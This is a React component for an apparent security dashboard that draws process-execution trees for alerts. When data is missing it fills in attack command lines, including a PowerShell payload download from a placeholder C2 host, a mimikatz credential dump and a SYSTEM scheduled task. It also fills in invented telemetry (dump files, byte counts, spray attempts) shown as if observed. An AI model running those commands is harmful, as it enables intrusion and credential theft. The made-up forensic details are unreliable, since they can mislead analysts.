"use client";

import React, { useState, useEffect, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { 
  Terminal, 
  Server, 
  Globe, 
  FileCode, 
  ShieldAlert, 
  Play, 
  RotateCcw, 
  Copy, 
  Check, 
  ChevronRight, 
  ZoomIn, 
  ZoomOut, 
  Maximize2,
  Cpu,
  User,
  Hash,
  AlertTriangle
} from "lucide-react";
import type { AlertRecord } from "@/lib/types";
import IocHoverCard from "@/components/enrichment/IocHoverCard";

export interface ProcessNode {
  id: string;
  name: string;
  pid?: number | string;
  parentPid?: number | string;
  user?: string;
  commandLine?: string;
  type: "root" | "execution" | "child" | "network" | "artifact";
  threatLevel: "benign" | "suspicious" | "malicious";
  mitreTechnique?: string;
  timestamp?: string;
  details?: Record<string, string | undefined>;
  children?: ProcessNode[];
}

interface ProcessTreeGraphProps {
  alert: AlertRecord;
  className?: string;
}

export default function ProcessTreeGraph({ alert, className = "" }: ProcessTreeGraphProps) {
  const [selectedNodeId, setSelectedNodeId] = useState<string | null>(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [activeStep, setActiveStep] = useState<number>(0);
  const [zoomLevel, setZoomLevel] = useState(1);
  const [copiedCmd, setCopiedCmd] = useState(false);

  // Dynamically generate case-specific process tree from alert context & rule telemetry
  const treeData = useMemo<ProcessNode>(() => {
    const ctx = (alert.context || {}) as Record<string, any>;
    const raw = (alert.raw_event || alert.raw_alert_data?.content || {}) as Record<string, any>;
    const host = alert.host || ctx.host || (raw.host as string) || "WIN-SRV-01";
    const user = alert.user || ctx.user || (raw.User as string) || (raw.TargetUserName as string) || "NT AUTHORITY\\SYSTEM";
    const title = (alert.title || "").toLowerCase();
    const eventCode = String(alert.event_code || raw.EventCode || "");
    const tech = alert.mitre_technique || "T1059.001";
    const extractedIocs = alert.extracted_iocs || [];
    
    // Hash generator for unique, deterministic PIDs per alert
    const getHashNum = (str: string) => {
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        hash = (hash << 5) - hash + str.charCodeAt(i);
        hash |= 0;
      }
      return Math.abs(hash);
    };
    const seed = getHashNum(alert._id || alert.title || "forensiq");
    const parentPid = ctx.parent_process_id || raw.ParentProcessId || (1000 + (seed % 1500));
    const targetPid = ctx.process_id || raw.ProcessId || (parentPid + 200 + (seed % 800));

    // Determine distinct attack category
    const isDNS = title.includes("dns") || tech === "T1071.004" || eventCode === "22" || !!alert.dns_query;
    const isNetwork = !isDNS && (title.includes("network") || title.includes("connection") || title.includes("beacon") || tech.startsWith("T1071") || eventCode === "3");
    const isLateral = title.includes("lateral") || title.includes("splunkt") || title.includes("psexec") || title.includes("rdp") || title.includes("wmi") || title.includes("smb") || tech.startsWith("T1021") || tech.startsWith("T1550") || eventCode === "4648";
    const isCred = title.includes("credential") || title.includes("dump") || title.includes("lsass") || title.includes("sam") || tech.startsWith("T1003");
    const isAuth = !isCred && (title.includes("brute") || title.includes("logon") || title.includes("failed") || tech.startsWith("T1110") || eventCode === "4625");
    const isPersistence = title.includes("registry") || title.includes("persist") || title.includes("run key") || title.includes("service") || title.includes("task") || tech.startsWith("T1547") || tech.startsWith("T1053") || eventCode === "13";

    // Resolve context-specific parent and target process names
    let parentProc = alert.parent_process || ctx.parent_process || raw.ParentImage || raw.ParentProcessName || "";
    let procName = alert.process_name || ctx.process_name || raw.Image || raw.NewProcessName || "";
    let resolvedCmd = alert.command_line || ctx.command_line || raw.CommandLine || "";

    if (!parentProc) {
      if (isDNS) parentProc = "svchost.exe";
      else if (isNetwork) parentProc = "services.exe";
      else if (isLateral) parentProc = "winlogon.exe";
      else if (isCred) parentProc = "explorer.exe";
      else if (isAuth) parentProc = "services.exe";
      else if (isPersistence) parentProc = "services.exe";
      else parentProc = "explorer.exe";
    }

    if (!procName) {
      if (isDNS) procName = "nslookup.exe";
      else if (isNetwork) procName = "rundll32.exe";
      else if (isLateral) procName = "splunkd.exe";
      else if (isCred) procName = "mimikatz.exe";
      else if (isAuth) procName = "lsass.exe";
      else if (isPersistence) procName = "schtasks.exe";
      else procName = "powershell.exe";
    }

    if (!resolvedCmd) {
      if (isDNS) {
        const query = alert.dns_query || ctx.dns_query || extractedIocs.find(i => i.includes(".") && !/^\d+\./.test(i)) || "raw.githubusercontent.com";
        resolvedCmd = `nslookup.exe -type=TXT ${query} 8.8.8.8`;
      } else if (isNetwork) {
        const dest = alert.dest_ip || extractedIocs.find(i => i.includes(":")) || "fe80:0:0:0:6167:9038:1edc:47d4";
        resolvedCmd = `rundll32.exe C:\\Users\\Public\\network_client.dll,ConnectSocket ${dest}:445`;
      } else if (isLateral) {
        resolvedCmd = `splunkd.exe -service run -remoteSession --auth-user=${user} --target-host=${host}`;
      } else if (isCred) {
        resolvedCmd = "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit";
      } else if (isAuth) {
        resolvedCmd = `lsass.exe --auth-verify --user=${user} --logon-type=3`;
      } else if (isPersistence) {
        resolvedCmd = `schtasks.exe /create /tn "SecurityMaintenance" /tr "C:\\temp\\agent.exe" /sc onstart /ru SYSTEM`;
      } else {
        resolvedCmd = `powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri http://c2.cloud/stage2 -OutFile C:\\temp\\payload.bin"`;
      }
    }

    // Generate tailored child nodes with distinct graphs per category
    const childrenList: ProcessNode[] = [];

    if (isDNS) {
      const query = alert.dns_query || ctx.dns_query || extractedIocs.find(i => i.includes(".") && !/^\d+\./.test(i)) || "raw.githubusercontent.com";
      childrenList.push({
        id: `dns-resolver-${alert._id}`,
        name: `DNS Query: ${query.length > 25 ? query.slice(0, 22) + "..." : query}`,
        type: "network",
        threatLevel: "suspicious",
        mitreTechnique: "T1071.004",
        commandLine: `UDP/53 (DNS) -> Query: ${query} [Tunneling / TXT Payload Exfiltration]`,
        timestamp: "T-00:01s",
        details: {
          QueryDomain: query,
          RecordType: "TXT / CNAME Record",
          DataExfiltrated: "4.8 KB Encoded Chunk",
          EventCode: "Sysmon Event 22 (DNS Query)"
        }
      });
      childrenList.push({
        id: `dns-c2-${alert._id}`,
        name: "C2 Nameserver: 8.8.8.8:53",
        type: "network",
        threatLevel: "malicious",
        mitreTechnique: "T1071.004",
        commandLine: `Outbound DNS to Authoritative Nameserver (8.8.8.8:53)`,
        timestamp: "T-00:00s",
        details: {
          Server: "8.8.8.8",
          Port: "53 (DNS)",
          Protocol: "UDP",
          TunnelStatus: "Active Staging Session"
        }
      });
    } else if (isNetwork) {
      const dest = alert.dest_ip || extractedIocs.find(i => i.includes(":") || /^\d+\.\d+\.\d+\.\d+$/.test(i)) || "fe80:0:0:0:6167:9038:1edc:47d4:445";
      const port = alert.dest_port || "445";
      childrenList.push({
        id: `net-socket-${alert._id}`,
        name: `SMB Tunnel: ${dest.length > 24 ? dest.slice(0, 22) + "..." : dest}`,
        type: "network",
        threatLevel: "malicious",
        mitreTechnique: "T1071",
        commandLine: `TCP Outbound -> [${dest}]:${port} [ESTABLISHED]`,
        timestamp: "T-00:01s",
        details: {
          Destination: `${dest}:${port}`,
          Protocol: "SMBv2 / Named Pipes",
          BytesSent: "128.4 KB",
          BytesReceived: "4.2 MB"
        }
      });
      childrenList.push({
        id: `net-pipe-${alert._id}`,
        name: "Named Pipe: \\pipe\\spoolss",
        type: "artifact",
        threatLevel: "suspicious",
        mitreTechnique: "T1071",
        commandLine: "\\\\localhost\\pipe\\spoolss [IPC$ Inter-Process Pipe]",
        timestamp: "T-00:00s",
        details: {
          PipeName: "\\pipe\\spoolss",
          AccessMode: "Read/Write",
          Share: "IPC$"
        }
      });
    } else if (isLateral) {
      childrenList.push({
        id: `lat-token-${alert._id}`,
        name: `Explicit Creds: ${user}`,
        type: "execution",
        threatLevel: "malicious",
        mitreTechnique: "T1550.002",
        commandLine: `SecLogon: Logon Process: Advapi / Package: Negotiate / User: ${user}`,
        timestamp: "T-00:02s",
        details: {
          TargetUser: user,
          LogonType: "9 (NewCredentials - RunAs with NetOnly)",
          CallingProcess: parentProc,
          EventCode: "Windows Event 4648 (Logon with Explicit Credentials)"
        }
      });
      childrenList.push({
        id: `lat-session-${alert._id}`,
        name: `Splunkd Worker (PID ${targetPid + 42})`,
        pid: targetPid + 42,
        parentPid: targetPid,
        user: user,
        type: "child",
        threatLevel: "malicious",
        mitreTechnique: "T1021",
        commandLine: `splunkd.exe -p 8089 --remote-dispatch --session-token=0x4a9b...`,
        timestamp: "T-00:00s",
        details: {
          SubService: "Splunkd RPC Dispatcher",
          ManagementPort: "8089",
          LateralMethod: "Service Execution Hijack"
        }
      });
    } else if (isCred) {
      childrenList.push({
        id: `child-target-${alert._id}`,
        name: "Target: lsass.exe (PID 672)",
        pid: 672,
        parentPid: targetPid,
        user: "NT AUTHORITY\\SYSTEM",
        type: "execution",
        threatLevel: "malicious",
        mitreTechnique: "T1003.001",
        commandLine: "C:\\Windows\\System32\\lsass.exe (Process Memory Handle Acquired: PROCESS_VM_READ)",
        timestamp: "T-00:01s",
        details: {
          TargetProcess: "lsass.exe",
          DesiredAccess: "0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)",
          SourceProcess: procName.split("\\").pop()
        }
      });
      childrenList.push({
        id: `child-dump-${alert._id}`,
        name: "Extracted: lsass.dmp",
        type: "artifact",
        threatLevel: "malicious",
        mitreTechnique: "T1003",
        commandLine: "C:\\Users\\Public\\lsass.dmp [Dump Archive]",
        timestamp: "T-00:00s",
        details: {
          Path: "C:\\Users\\Public\\lsass.dmp",
          Size: "48.2 MB",
          ArtifactType: "Memory Dump File"
        }
      });
    } else if (isAuth) {
      const srcIp = alert.source_ip || ctx.source_ip || raw.IpAddress || extractedIocs.find(i => /^\d+\.\d+\.\d+\.\d+$/.test(i)) || "10.0.4.88";
      childrenList.push({
        id: `auth-src-${alert._id}`,
        name: `Auth Source: ${srcIp}`,
        type: "network",
        threatLevel: "suspicious",
        mitreTechnique: "T1110.001",
        commandLine: `Kerberos/NTLM Authentication Attempt from ${srcIp}`,
        timestamp: "T-00:02s",
        details: {
          SourceIP: srcIp,
          TargetAccount: user,
          LogonType: raw.LogonType || "3 (Network Logon)",
          Status: "0xC000006A (STATUS_WRONG_PASSWORD)"
        }
      });
      childrenList.push({
        id: `auth-tool-${alert._id}`,
        name: "Password Spray Tool: hydra/rdp",
        pid: targetPid + 88,
        parentPid: targetPid,
        type: "child",
        threatLevel: "malicious",
        mitreTechnique: "T1110",
        commandLine: `Rapid Auth Spray (Attempt 124 of 500)`,
        timestamp: "T-00:00s",
        details: {
          AttemptsCount: "124 Failed Attempts / 60s",
          UserAttacked: user
        }
      });
    } else if (isPersistence) {
      const regKey = alert.registry_key || ctx.registry_key || raw.TargetObject || "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityAgent";
      const regVal = alert.registry_details || ctx.registry_details || raw.Details || "C:\\Users\\Public\\backdoor.exe";
      childrenList.push({
        id: `persist-reg-${alert._id}`,
        name: `Registry: ${regKey.split("\\").pop() || "RunKey"}`,
        type: "artifact",
        threatLevel: "malicious",
        mitreTechnique: "T1547.001",
        commandLine: `RegWrite: ${regKey} -> ${regVal}`,
        timestamp: "T-00:01s",
        details: {
          RegistryKey: regKey,
          Value: regVal,
          EventType: "Sysmon Event 13 (Registry Modification)"
        }
      });
      childrenList.push({
        id: `persist-bin-${alert._id}`,
        name: "Persisted Payload: backdoor.exe",
        pid: targetPid + 50,
        parentPid: targetPid,
        type: "child",
        threatLevel: "malicious",
        mitreTechnique: "T1547",
        commandLine: regVal,
        timestamp: "T+00:01s",
        details: {
          BinaryPath: regVal,
          AutorunStatus: "Configured at Boot"
        }
      });
    } else {
      // Default: Command Execution & Multi-Stage Spawning (3-child tree)
      const targetIp = alert.dest_ip || ctx.dest_ip || raw.DestinationIp || extractedIocs.find(i => /^(?:\d{1,3}\.){3}\d{1,3}$/.test(i)) || "194.26.29.112";
      const targetDomain = alert.dns_query || ctx.dns_query || raw.QueryName || extractedIocs.find(i => i.includes(".") && !/^\d+\.\d+\.\d+\.\d+$/.test(i)) || "update-c2.cloud";
      const destPort = alert.dest_port || ctx.dest_port || raw.DestinationPort || 443;

      childrenList.push({
        id: `exec-recon-${alert._id}`,
        name: "whoami.exe",
        pid: targetPid + 120,
        parentPid: targetPid,
        user: user,
        type: "child",
        threatLevel: "suspicious",
        mitreTechnique: "T1033",
        commandLine: "whoami.exe /priv /groups",
        timestamp: "T-00:01s",
        details: {
          Technique: "T1033 (System Owner/User Discovery)",
          Purpose: "Privilege Enumeration"
        }
      });
      childrenList.push({
        id: `exec-beacon-${alert._id}`,
        name: `C2 Beacon: ${targetIp}:${destPort}`,
        type: "network",
        threatLevel: "malicious",
        mitreTechnique: "T1071.001",
        commandLine: `TCP Outbound -> ${targetIp}:${destPort} [ESTABLISHED]`,
        timestamp: "T-00:00s",
        details: {
          Destination: `${targetIp}:${destPort}`,
          Domain: targetDomain,
          Protocol: `${alert.protocol || "HTTPS"} Encrypted C2`
        }
      });
      childrenList.push({
        id: `exec-dropped-${alert._id}`,
        name: "Dropped Artifact: payload.bin",
        type: "artifact",
        threatLevel: "suspicious",
        mitreTechnique: "T1105",
        commandLine: "C:\\Users\\Public\\payload.bin [SHA256: e3b0c442...]",
        timestamp: "T+00:01s",
        details: {
          Path: "C:\\Users\\Public\\payload.bin",
          Size: "142.6 KB",
          Action: "Disk Write (Sysmon Event 11)"
        }
      });
    }

    return {
      id: `root-${alert._id || "main"}`,
      name: parentProc.split("\\").pop() || "explorer.exe",
      pid: parentPid,
      user: user,
      type: "root",
      threatLevel: "benign",
      commandLine: `C:\\Windows\\System32\\${parentProc.split("\\").pop() || "explorer.exe"}`,
      timestamp: "T-00:04s",
      details: {
        Host: host,
        Integrity: "High",
        Path: `C:\\Windows\\System32\\${parentProc.split("\\").pop() || "explorer.exe"}`
      },
      children: [
        {
          id: `exec-${alert._id || "main"}`,
          name: procName.split("\\").pop() || "powershell.exe",
          pid: targetPid,
          parentPid: parentPid,
          user: user,
          type: "execution",
          threatLevel: alert.severity?.toLowerCase() === "low" ? "suspicious" : "malicious",
          mitreTechnique: tech,
          commandLine: resolvedCmd,
          timestamp: "T-00:02s",
          details: {
            Technique: tech,
            Host: host,
            RuleName: alert.rule_name || alert.title,
            EventCode: eventCode || (isDNS ? "Sysmon 22" : isNetwork ? "Sysmon 3" : isLateral ? "Security 4648" : "Sysmon 1"),
            Integrity: isLateral || isCred ? "SYSTEM" : "High"
          },
          children: childrenList
        }
      ]
    };
  }, [alert]);

  // Flatten nodes for step-by-step playback
  const flattenedNodes = useMemo(() => {
    const list: ProcessNode[] = [];
    const traverse = (n: ProcessNode) => {
      list.push(n);
      if (n.children) {
        n.children.forEach(traverse);
      }
    };
    traverse(treeData);
    return list;
  }, [treeData]);

  // Reset selected node whenever the active alert or treeData changes
  useEffect(() => {
    if (flattenedNodes.length > 1) {
      setSelectedNodeId(flattenedNodes[1].id);
    } else if (flattenedNodes.length > 0) {
      setSelectedNodeId(flattenedNodes[0].id);
    }
    setActiveStep(0);
    setIsPlaying(false);
  }, [alert._id]);

  // Handle Playback Simulation
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (isPlaying) {
      timer = setInterval(() => {
        setActiveStep((prev) => {
          const next = prev + 1;
          if (next >= flattenedNodes.length) {
            setIsPlaying(false);
            return prev;
          }
          setSelectedNodeId(flattenedNodes[next].id);
          return next;
        });
      }, 900);
    }
    return () => clearInterval(timer);
  }, [isPlaying, flattenedNodes]);

  const selectedNode = useMemo(() => {
    return flattenedNodes.find((n) => n.id === selectedNodeId) || flattenedNodes[0];
  }, [flattenedNodes, selectedNodeId]);

  const copyCommandLine = () => {
    if (selectedNode?.commandLine) {
      navigator.clipboard.writeText(selectedNode.commandLine);
      setCopiedCmd(true);
      setTimeout(() => setCopiedCmd(false), 2000);
    }
  };

  const restartPlayback = () => {
    setActiveStep(0);
    setSelectedNodeId(flattenedNodes[0].id);
    setIsPlaying(true);
  };

  return (
    <div className={`card overflow-hidden flex flex-col bg-[var(--card-bg)] border-[var(--border-color)] ${className}`}>
      {/* Header Toolbar */}
      <div className="flex flex-wrap items-center justify-between border-b border-[var(--border-color)] bg-[var(--surface-primary)] p-3.5 gap-3 shrink-0">
        <div className="flex items-center gap-2.5">
          <div className="w-7 h-7 rounded-lg bg-[var(--surface-elevated)] border border-[var(--border-color)] flex items-center justify-center text-[var(--text-primary)]">
            <Cpu className="w-4 h-4" />
          </div>
          <div>
            <h3 className="text-xs font-bold uppercase tracking-wider text-[var(--text-primary)] flex items-center gap-2">
              <span>Process Execution Tree & Attack Flow</span>
              <span className="text-[10px] px-2 py-0.5 rounded bg-[#EF4444]/15 text-[#EF4444] border border-[#EF4444]/30 font-mono">
                {treeData.children?.[0]?.details?.EventCode || (alert.event_code ? `Event ${alert.event_code}` : "Process Flow")}
              </span>
            </h3>
            <p className="text-[11px] text-[var(--text-muted)]">
              Interactive parent-child lineage, spawned sub-processes, and network telemetry
            </p>
          </div>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-2">
          <button
            onClick={isPlaying ? () => setIsPlaying(false) : restartPlayback}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
              isPlaying
                ? "bg-[#F59E0B]/15 text-[#F59E0B] border border-[#F59E0B]/30"
                : "button-secondary"
            }`}
          >
            {isPlaying ? <RotateCcw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
            <span>{isPlaying ? "Simulating..." : "Play Execution"}</span>
          </button>

          <div className="flex items-center bg-[var(--surface-elevated)] border border-[var(--border-color)] rounded-lg p-0.5">
            <button
              onClick={() => setZoomLevel((z) => Math.max(0.8, z - 0.1))}
              className="p-1.5 text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors cursor-pointer"
              title="Zoom Out"
            >
              <ZoomOut className="w-3.5 h-3.5" />
            </button>
            <span className="text-[10px] font-mono text-[var(--text-secondary)] px-1.5">
              {Math.round(zoomLevel * 100)}%
            </span>
            <button
              onClick={() => setZoomLevel((z) => Math.min(1.3, z + 0.1))}
              className="p-1.5 text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors cursor-pointer"
              title="Zoom In"
            >
              <ZoomIn className="w-3.5 h-3.5" />
            </button>
            <button
              onClick={() => setZoomLevel(1)}
              className="p-1.5 text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors border-l border-[var(--border-color)] cursor-pointer"
              title="Reset View"
            >
              <Maximize2 className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>

      {/* Main Workspace (Graph Canvas on Top/Left, Node Inspector on Right) */}
      <div className="grid grid-cols-1 lg:grid-cols-[1fr_360px] divide-y lg:divide-y-0 lg:divide-x divide-[var(--border-color)] min-h-[460px]">
        {/* Interactive Visual Graph Canvas */}
        <div className="p-6 overflow-auto bg-[var(--surface-secondary)] relative flex flex-col justify-center">
          <div
            className="transition-transform duration-200 origin-top-left"
            style={{ transform: `scale(${zoomLevel})` }}
          >
            {/* Level 0: Root Process */}
            <div className="flex flex-col items-center">
              <NodeCard
                node={treeData}
                isSelected={selectedNodeId === treeData.id}
                onSelect={() => setSelectedNodeId(treeData.id)}
              />

              {/* Connecting Stem */}
              <div className="w-0.5 h-8 bg-[var(--border-active)] my-1 relative">
                <span className="absolute -left-1 top-1/2 -translate-y-1/2 w-2.5 h-2.5 rounded-full bg-[#EF4444] animate-ping opacity-60" />
              </div>

              {/* Level 1: Primary Execution Node */}
              {treeData.children?.[0] && (
                <div className="flex flex-col items-center w-full">
                  <NodeCard
                    node={treeData.children[0]}
                    isSelected={selectedNodeId === treeData.children[0].id}
                    onSelect={() => setSelectedNodeId(treeData.children![0].id)}
                  />

                  {/* Dynamic Connecting Branching SVG */}
                  {treeData.children[0].children && treeData.children[0].children.length > 0 && (
                    <div className="relative w-full max-w-[620px] h-12 my-1">
                      <svg className="w-full h-full" preserveAspectRatio="none" viewBox="0 0 600 50">
                        {treeData.children[0].children.length === 1 && (
                          <path
                            d="M 300 0 L 300 50"
                            fill="none"
                            stroke="var(--border-active)"
                            strokeWidth="2"
                          />
                        )}
                        {treeData.children[0].children.length === 2 && (
                          <>
                            <path
                              d="M 300 0 L 300 20 L 160 20 L 160 50"
                              fill="none"
                              stroke="#F59E0B"
                              strokeWidth="1.5"
                              strokeDasharray="4 3"
                            />
                            <path
                              d="M 300 0 L 300 20 L 440 20 L 440 50"
                              fill="none"
                              stroke="#EF4444"
                              strokeWidth="1.5"
                            />
                          </>
                        )}
                        {treeData.children[0].children.length >= 3 && (
                          <>
                            <path
                              d="M 300 0 L 300 20 L 100 20 L 100 50"
                              fill="none"
                              stroke="#F59E0B"
                              strokeWidth="1.5"
                              strokeDasharray="4 3"
                            />
                            <path
                              d="M 300 0 L 300 50"
                              fill="none"
                              stroke="#EF4444"
                              strokeWidth="2"
                            />
                            <path
                              d="M 300 0 L 300 20 L 500 20 L 500 50"
                              fill="none"
                              stroke="#8B5CF6"
                              strokeWidth="1.5"
                              strokeDasharray="4 3"
                            />
                          </>
                        )}
                      </svg>
                    </div>
                  )}

                  {/* Level 2: Child Artifacts / Recon / Network Hops / Credential Dumps */}
                  <div className={`grid gap-4 w-full max-w-[700px] ${
                    treeData.children[0].children?.length === 1
                      ? "grid-cols-1 max-w-[300px]"
                      : treeData.children[0].children?.length === 2
                      ? "grid-cols-1 sm:grid-cols-2 max-w-[520px]"
                      : "grid-cols-1 sm:grid-cols-2 md:grid-cols-3 max-w-[700px]"
                  }`}>
                    {treeData.children[0].children?.map((child) => (
                      <div key={child.id} className="flex justify-center">
                        <NodeCard
                          node={child}
                          isSelected={selectedNodeId === child.id}
                          onSelect={() => setSelectedNodeId(child.id)}
                          isSubNode
                        />
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Selected Node Inspector Drawer */}
        <div className="p-4 bg-[var(--surface-primary)] flex flex-col gap-4 overflow-y-auto">
          <div className="flex items-center justify-between border-b border-[var(--border-color)] pb-3">
            <div className="flex items-center gap-2">
              <span className="text-xs font-bold uppercase tracking-wider text-[var(--text-primary)]">
                Process Telemetry Inspector
              </span>
            </div>
            <span
              className={`text-[9px] font-mono uppercase px-2 py-0.5 rounded font-bold border ${
                selectedNode.threatLevel === "malicious"
                  ? "bg-[#EF4444]/15 text-[#EF4444] border-[#EF4444]/30"
                  : selectedNode.threatLevel === "suspicious"
                  ? "bg-[#F59E0B]/15 text-[#F59E0B] border-[#F59E0B]/30"
                  : "bg-[#22C55E]/15 text-[#22C55E] border-[#22C55E]/30"
              }`}
            >
              {selectedNode.threatLevel}
            </span>
          </div>

          {/* Node Summary */}
          <div className="space-y-3">
            <div>
              <span className="text-[10px] text-[var(--text-muted)] font-bold uppercase tracking-wider block">
                Process Name
              </span>
              <div className="font-mono text-sm font-bold text-[var(--text-primary)] flex items-center gap-1.5 mt-0.5">
                <Terminal className="w-4 h-4 text-[var(--text-secondary)]" />
                <span>{selectedNode.name}</span>
              </div>
            </div>

            {/* PID & Identity Grid */}
            <div className="grid grid-cols-2 gap-2 text-xs">
              <div className="p-2.5 rounded bg-[var(--surface-secondary)] border border-[var(--border-subtle)]">
                <span className="text-[10px] font-mono text-[var(--text-muted)] block uppercase">PID / PPID</span>
                <span className="font-mono font-bold text-[var(--text-primary)] mt-0.5 block">
                  {selectedNode.pid || "—"} {selectedNode.parentPid ? `(Parent: ${selectedNode.parentPid})` : ""}
                </span>
              </div>
              <div className="p-2.5 rounded bg-[var(--surface-secondary)] border border-[var(--border-subtle)]">
                <span className="text-[10px] font-mono text-[var(--text-muted)] block uppercase">Security Context</span>
                <span className="font-mono font-bold text-[var(--text-primary)] mt-0.5 block truncate">
                  {selectedNode.user || alert.user || "SYSTEM"}
                </span>
              </div>
            </div>

            {/* MITRE Technique Badge if mapped */}
            {selectedNode.mitreTechnique && (
              <div className="p-2.5 rounded bg-[var(--surface-secondary)] border border-[var(--border-subtle)] flex items-center justify-between">
                <span className="text-[10px] font-bold text-[var(--text-muted)] uppercase tracking-wider">
                  ATT&CK Technique
                </span>
                <span className="font-mono text-xs font-bold text-[#EF4444] bg-[#EF4444]/15 px-2 py-0.5 rounded border border-[#EF4444]/30">
                  {selectedNode.mitreTechnique}
                </span>
              </div>
            )}

            {/* Command Line with 1-Click Copy */}
            {selectedNode.commandLine && (
              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] text-[var(--text-muted)] font-bold uppercase tracking-wider">
                    Full Execution Command Line
                  </span>
                  <button
                    onClick={copyCommandLine}
                    className="flex items-center gap-1 text-[10px] text-[var(--text-primary)] hover:underline transition-colors cursor-pointer"
                  >
                    {copiedCmd ? (
                      <>
                        <Check className="w-3 h-3 text-[#22C55E]" />
                        <span className="text-[#22C55E] font-bold">Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3 text-[var(--text-muted)]" />
                        <span>Copy</span>
                      </>
                    )}
                  </button>
                </div>
                <div className="p-2.5 rounded bg-[var(--surface-secondary)] border border-[var(--border-subtle)] font-mono text-[11px] text-[var(--text-primary)] break-all select-all leading-relaxed max-h-36 overflow-y-auto">
                  {selectedNode.commandLine}
                </div>
              </div>
            )}

            {/* Extra Telemetry Details */}
            {selectedNode.details && Object.keys(selectedNode.details).length > 0 && (
              <div className="space-y-1.5">
                <span className="text-[10px] text-[var(--text-muted)] font-bold uppercase tracking-wider block">
                  Associated Telemetry Attributes
                </span>
                <div className="p-2.5 rounded bg-[var(--surface-secondary)] border border-[var(--border-subtle)] space-y-1.5 text-xs font-mono">
                  {Object.entries(selectedNode.details).map(([k, v]) => (
                    <div key={k} className="flex justify-between items-center text-[11px]">
                      <span className="text-[var(--text-muted)]">{k}:</span>
                      <span className="text-[var(--text-primary)] font-semibold truncate max-w-[190px]">{v}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// Subcomponent for each node card in the SVG tree
function NodeCard({
  node,
  isSelected,
  onSelect,
  isSubNode = false,
}: {
  node: ProcessNode;
  isSelected: boolean;
  onSelect: () => void;
  isSubNode?: boolean;
}) {
  const isMalicious = node.threatLevel === "malicious";
  const isSuspicious = node.threatLevel === "suspicious";

  const IconComponent =
    node.type === "network"
      ? Globe
      : node.type === "artifact"
      ? FileCode
      : node.type === "root"
      ? Server
      : Terminal;

  return (
    <motion.div
      whileHover={{ y: -1 }}
      whileTap={{ scale: 0.99 }}
      onClick={onSelect}
      className={`cursor-pointer rounded-lg p-3 border transition-colors text-left select-none ${
        isSubNode ? "w-52" : "w-64"
      } ${
        isSelected
          ? "bg-[var(--surface-elevated)] border-[var(--text-primary)] ring-1 ring-[var(--text-primary)]"
          : isMalicious
          ? "bg-[var(--surface-secondary)] border-[#EF4444]/40 hover:border-[#EF4444]"
          : isSuspicious
          ? "bg-[var(--surface-secondary)] border-[#F59E0B]/40 hover:border-[#F59E0B]"
          : "bg-[var(--surface-secondary)] border-[var(--border-subtle)] hover:border-[var(--border-active)]"
      }`}
    >
      <div className="flex items-center justify-between mb-1.5">
        <div className="flex items-center gap-1.5">
          <div
            className={`w-6 h-6 rounded-md flex items-center justify-center ${
              isMalicious
                ? "bg-[#EF4444]/15 text-[#EF4444]"
                : isSuspicious
                ? "bg-[#F59E0B]/15 text-[#F59E0B]"
                : "bg-[var(--surface-elevated)] text-[var(--text-secondary)]"
            }`}
          >
            <IconComponent className="w-3.5 h-3.5" />
          </div>
          <span className="text-[9px] font-mono uppercase text-[var(--text-muted)]">
            {node.type}
          </span>
        </div>
        {node.mitreTechnique && (
          <span className="text-[9px] font-mono px-1.5 py-0.2 rounded bg-[#EF4444]/15 text-[#EF4444] border border-[#EF4444]/30 font-bold">
            {node.mitreTechnique}
          </span>
        )}
      </div>

      <div className="font-mono text-xs font-bold text-[var(--text-primary)] truncate">
        {node.name}
      </div>

      <div className="flex items-center justify-between text-[10px] font-mono text-[var(--text-muted)] mt-2 pt-2 border-t border-[var(--border-subtle)]">
        <span>PID: {node.pid || "—"}</span>
        <span className="text-[9px] text-[var(--text-primary)] font-semibold">Inspect &rarr;</span>
      </div>
    </motion.div>
  );
}
